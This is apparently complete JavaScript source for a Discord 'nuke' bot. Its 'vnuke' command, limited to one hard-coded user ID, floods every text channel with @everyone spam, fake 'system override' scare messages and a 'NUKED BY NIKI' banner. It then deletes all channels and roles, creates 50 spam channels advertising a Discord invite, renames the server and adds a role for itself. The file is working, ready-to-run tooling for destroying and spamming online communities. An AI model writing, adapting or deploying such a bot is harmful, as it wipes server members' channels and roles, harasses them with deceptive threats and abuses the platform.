require('dotenv').config();
const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, EmbedBuilder } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.DirectMessages
    ]
});

const PREFIX = process.env.PREFIX || '!';
const AUTHORIZED_ID = "1474433573174907054";

// ============================================================
// ASCII ART FOR NUKE
// ============================================================
const ASCII_BANNER = `
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║    ███╗   ██╗██╗██╗  ██╗██╗      █████╗ ██╗██╗         ║
║    ████╗  ██║██║██║ ██╔╝██║     ██╔══██╗██║██║         ║
║    ██╔██╗ ██║██║█████╔╝ ██║     ███████║██║██║         ║
║    ██║╚██╗██║██║██╔═██╗ ██║     ██╔══██║██║██║         ║
║    ██║ ╚████║██║██║  ██╗███████╗██║  ██║██║██║         ║
║    ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝         ║
║                                                           ║
║              💀  NUKED BY NIKI  💀                       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
`;

// ============================================================
// SCARY MESSAGES (REAL HACKER/NUKE STYLE)
// ============================================================
const SCARY_MESSAGES = [
    '@everyone @here\n\n=== SYSTEM OVERRIDE ===\n\n[!] TARGET SERVER IDENTIFIED FOR TERMINATION\n[!] INITIATING PROTOCOL N3R0\n[!] ALL CHANNELS WILL BE PERMANENTLY DESTROYED\n[!] DATABASE CORRUPTION: 100% COMPLETE\n\nACCESS DENIED PERMANENTLY\nYOUR SERVER HAS BEEN TERMINATED',
    
    '@everyone @here\n\n=== CRITICAL SYSTEM FAILURE ===\n\n[!] ROOT ACCESS GRANTED TO NIKI\n[!] EXECUTING KILL COMMAND\n[!] ALL DATA BEING PERMANENTLY WIPED\n[!] USER DATA CORRUPTED\n[!] BACKUP FILES DESTROYED\n\nSYSTEM SHUTDOWN INITIATED\nTHIS SERVER IS NOW OFFLINE',
    
    '@everyone @here\n\n=== SECURITY BREACH DETECTED ===\n\n[!] UNAUTHORIZED ACCESS: NIKI\n[!] ALL PERMISSIONS REVOKED\n[!] ENCRYPTION BYPASSED\n[!] FIREWALL DISABLED\n[!] CHANNEL STRUCTURE COMPROMISED\n\nALL DATA WILL BE PURGED IN 3...2...1...'
];

// ============================================================
// NIKI VICTORY MESSAGES
// ============================================================
const VICTORY_MESSAGES = [
    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI RULES !**\n**NIKI IS THE KING !**\n\nTHIS SERVER HAS BEEN DESTROYED BY THE LEGEND\n**NIKI WINS !**',
    
    '@everyone @here\n\n**NIKI IS UNSTOPPABLE !**\n**NIKI IS THE BEST !**\n**NIKI DESTROYED THIS SERVER !**\n\n**NIKI ON TOP !**',
    
    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n\nTHIS SERVER IS NOW NIKI\'S PROPERTY\n**NIKI RULES EVERYTHING !**',
    
    '@everyone @here\n\n**THE LEGEND NIKI !**\n**THE KING NIKI !**\n**THE GOD NIKI !**\n\nTHIS SERVER HAS BEEN CLAIMED BY NIKI\n**NIKI ON TOP FOREVER !**',
    
    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n\n**NIKI IS THE GOAT !**\n**NIKI IS THE KING !**',
    
    '@everyone @here\n\n**NIKI WINS AGAIN !**\n**NIKI DESTROYS ALL !**\n**NIKI ON TOP !**\n\n**THIS SERVER IS NOW NIKI\'S PLAYGROUND !**'
];

// ============================================================
// SCARY IMAGES
// ============================================================
const HACKER_IMAGES = [
    'https://i.imgur.com/2wI8t0V.png',
    'https://i.imgur.com/3hqP4G6.png',
    'https://i.imgur.com/5VjN7pK.png',
    'https://i.imgur.com/8XqVp7M.png',
    'https://i.imgur.com/4YqVp8M.png'
];

// ============================================================
// CHANNEL NAMES WITH NUMBERS
// ============================================================
const SCARY_NAMES = [
    'NIKI-ON-TOP-01', 'NIKI-RULES-02', 'NIKI-KING-03', 'NIKI-GOAT-04', 'NIKI-LEGEND-05',
    'NIKI-WINS-06', 'NIKI-DESTROYS-07', 'NIKI-UNSTOPPABLE-08', 'NIKI-GOD-09', 'NIKI-ON-TOP-10',
    'TERMINATED-11', 'DELETED-12', 'CORRUPTED-13', 'SYSTEM-FAILURE-14', 'ACCESS-DENIED-15',
    'DESTROYED-16', 'PURGED-17', 'ERASED-18', 'OVERRIDDEN-19', 'COMPROMISED-20',
    'INFECTED-21', 'HACKED-22', 'BREACHED-23', 'DETONATED-24', 'NEUTRALIZED-25',
    'ANNHILATED-26', 'OBLITERATED-27', 'EXTINGUISHED-28', 'DECIMATED-29', 'EXTERMINATED-30',
    'LIQUIDATED-31', 'ERADICATED-32', 'VAPORIZED-33', 'EXPLODED-34', 'SHATTERED-35',
    'CRUSHED-36', 'DISMANTLED-37', 'SCRAPPED-38', 'TRASHED-39', 'GARBAGED-40',
    'NUKED-41', 'RAZED-42', 'LEVELED-43', 'FLATTENED-44', 'GROUNDED-45',
    'TERMINAL-46', 'FATAL-47', 'CRITICAL-48', 'EMERGENCY-49', 'DISASTER-50'
];

// ============================================================
const inviteLink = 'https://discord.gg/eVTU7sW3wv';

// ============================================================
// STATS COUNTER
// ============================================================
let totalNukes = 0;
let totalChannelsDeleted = 0;
let totalRolesDeleted = 0;
let totalChannelsCreated = 0;

client.once('ready', () => {
    console.log(`✅ Connected as ${client.user.tag}`);
    console.log(`📊 ${client.guilds.cache.size} servers`);
    console.log(`🔧 Prefix: ${PREFIX}`);
    console.log(`👤 Authorized user ID: ${AUTHORIZED_ID}`);
    console.log('====================================');
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'vnuke') {
        await handleNuke(message);
    }
});

async function handleNuke(message) {
    if (message.author.id !== AUTHORIZED_ID) {
        return message.reply('❌ You are not authorized to use this command!');
    }

    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ You need administrator permissions!');
    }

    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ I need administrator permissions!');
    }

    await message.reply('💀 **NUKE INITIALIZED...**');

    const guild = message.guild;
    const guildName = guild.name;
    let channelsDeleted = 0;
    let rolesDeleted = 0;
    let channelsCreated = 0;

    try {
        // 1. Send warnings in all channels
        const channels = guild.channels.cache;
        for (const [id, channel] of channels) {
            if (channel.type === ChannelType.GuildText) {
                try {
                    await channel.send('```' + ASCII_BANNER + '```');
                    const msg1 = SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)];
                    await channel.send(msg1);
                    
                    // Send victory message in each channel
                    const victoryMsg = VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)];
                    await channel.send(victoryMsg);
                    
                    const embed = new EmbedBuilder()
                        .setColor(0xFF0000)
                        .setTitle('☠ SYSTEM COMPROMISED ☠')
                        .setDescription('**SERVER TERMINATION SUCCESSFUL**\n**NIKI ON TOP !**')
                        .setImage(HACKER_IMAGES[Math.floor(Math.random() * HACKER_IMAGES.length)])
                        .setFooter({ text: 'NIKI RULES ☠' })
                        .setTimestamp();
                    await channel.send({ embeds: [embed] });
                } catch {}
            }
        }

        // 2. Delete all channels
        for (const [id, channel] of channels) {
            try {
                await channel.delete();
                channelsDeleted++;
            } catch (e) {}
        }

        // 3. Delete all roles (except @everyone)
        const roles = guild.roles.cache;
        for (const [id, role] of roles) {
            if (role.name !== '@everyone') {
                try {
                    await role.delete();
                    rolesDeleted++;
                } catch (e) {}
            }
        }

        // 4. Create 50 new channels with numbers
        for (let i = 0; i < 50; i++) {
            const name = SCARY_NAMES[i % SCARY_NAMES.length];
            try {
                const channel = await guild.channels.create({
                    name: name,
                    type: ChannelType.GuildText,
                });
                const victoryMsg = VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)];
                await channel.send(victoryMsg);
                await channel.send('```' + ASCII_BANNER + '```');
                await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
                channelsCreated++;
            } catch (e) {}
        }

        // 5. Rename server with numbers
        const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
        try {
            await guild.setName(`☠ NIKI-ON-TOP-${nukeNumber} ☠`);
        } catch (e) {}

        // 6. Create special role
        try {
            const role = await guild.roles.create({
                name: '☠ NIKI ON TOP ☠',
                color: '#FF0000',
                hoist: true,
                mentionable: true
            });
            const botMember = guild.members.me;
            await botMember.roles.add(role);
        } catch (e) {}

        // 7. Update global stats
        totalNukes++;
        totalChannelsDeleted += channelsDeleted;
        totalRolesDeleted += rolesDeleted;
        totalChannelsCreated += channelsCreated;

        // 8. Send DM with stats
        const dmEmbed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('☠ NUKE EXECUTED SUCCESSFULLY ☠')
            .setDescription(`**TARGET SERVER:** ${guildName}`)
            .addFields(
                { name: '💀 Channels Deleted', value: `${channelsDeleted}`, inline: true },
                { name: '🎭 Roles Deleted', value: `${rolesDeleted}`, inline: true },
                { name: '📝 Channels Created', value: `${channelsCreated}`, inline: true },
                { name: '📊 Total Nukes', value: `${totalNukes}`, inline: true },
                { name: '🗑️ Total Channels Deleted', value: `${totalChannelsDeleted}`, inline: true },
                { name: '📝 Total Channels Created', value: `${totalChannelsCreated}`, inline: true }
            )
            .setFooter({ text: 'NIKI ON TOP ☠' })
            .setTimestamp();

        try {
            await message.author.send({ embeds: [dmEmbed] });
        } catch (e) {}

        const finalVictory = VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)];
        await message.channel.send(`✅ **NUKE COMPLETE!**\n\n${finalVictory}\n\n**@everyone @here** THIS SERVER IS NOW NIKI'S PROPERTY`);

    } catch (error) {
        console.error(error);
        await message.channel.send('❌ Error during nuke: ' + error.message);
    }
}

client.login(process.env.TOKEN);